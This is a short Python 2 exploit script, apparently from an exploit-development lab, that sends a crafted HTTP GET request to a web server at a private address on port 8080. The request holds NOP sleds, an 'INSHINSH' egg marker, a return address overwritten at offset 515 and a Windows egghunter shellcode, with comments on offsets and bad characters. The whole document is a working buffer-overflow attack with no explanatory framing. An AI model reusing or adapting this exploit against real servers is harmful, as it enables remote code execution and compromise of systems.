#!/usr/bin/env python
import socket

# position 515
# ret addr 0x77def069

#second shellcode position =  31

# egghunter \x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x49\x4E\x53\x48\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7

#badchars \x20\x3f

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x49\x4e\x53\x48\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

buff =  "GET /" + "\x90" * 31 + "INSHINSH" + "\x90" * (515 - 31 - 8) + "\x69\xf0\xde\x77" + egghunter + "C" * (600 - 515 - 4 - len(egghunter)) + " HTTP/1.0\r\n\r\n" 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(("192.168.127.130",8080))
s.send(buff)
print s.recv(1024)
s.close()
